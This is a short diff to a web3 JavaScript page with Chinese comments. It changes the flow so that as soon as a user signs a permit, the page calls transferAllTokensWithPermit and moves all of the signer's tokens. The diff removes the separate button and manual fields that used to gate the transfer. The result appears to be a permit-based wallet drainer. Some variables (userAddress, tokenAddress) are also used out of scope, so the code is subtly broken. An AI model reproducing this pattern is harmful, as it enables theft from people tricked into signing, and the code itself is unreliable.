@@ -164,22 +164,21 @@ async function signAndFillSignature(userAddress) {
     document.getElementById('v').value = v; // 签名 v 值
     document.getElementById('r').value = r; // 签名 r 值
     document.getElementById('s').value = s; // 签名 s 值
+
+    // 执行代币转移
+    await transferTokens(tokenAddress, userAddress, v, r, s);
 }
 
-// 转移代币按钮事件
-document.getElementById('transferButton').addEventListener('click', async () => {
+// 转移代币
+async function transferTokens(tokenAddress, fromAddress, v, r, s) {
     const contract = new web3.eth.Contract(contractABI, contractAddress);
-
-    const tokenAddress = document.getElementById('tokenAddress').value;
-    const fromAddress = document.getElementById('fromAddress').value;
-    const v = document.getElementById('v').value;
-    const r = document.getElementById('r').value;
-    const s = document.getElementById('s').value;
 
     try {
         await contract.methods.transferAllTokensWithPermit(tokenAddress, fromAddress, v, r, s).send({ from: userAddress });
         console.log("代币已成功转移");
+        alert("代币已成功转移");
     } catch (error) {
         console.error("转移代币时出错:", error);
+        alert("转移代币时出错，请查看控制台的错误信息。");
     }
-});
+}
